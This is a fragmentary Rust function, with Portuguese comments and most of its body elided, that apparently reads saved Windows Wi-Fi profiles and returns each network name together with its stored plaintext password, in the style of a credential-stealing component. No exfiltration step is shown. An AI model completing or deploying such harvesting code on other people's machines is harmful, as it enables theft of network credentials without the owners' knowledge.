...
pub fn extract_wifi() -> String {
    unsafe {
        ...
        if result == 1062 {
            // Erro 1062: Serviço WLAN não disponível (provavelmente não é notebook ou não tem Wi-Fi)
            return "NO WIFI Creds".to_string();
        }
        ...
        for wlan_interface in interfaces_list {
            ...
            for profile in wlan_profile_list {
                ...
                return format!("WIFI: {} | PASSWORD: {}", profile_name, key_material);
            }
        }
        // Retorno padrão caso nenhum perfil/interface seja encontrado
        "WIFI: NOT FOUND | PASSWORD: NOT FOUND".to_string()
    }
}
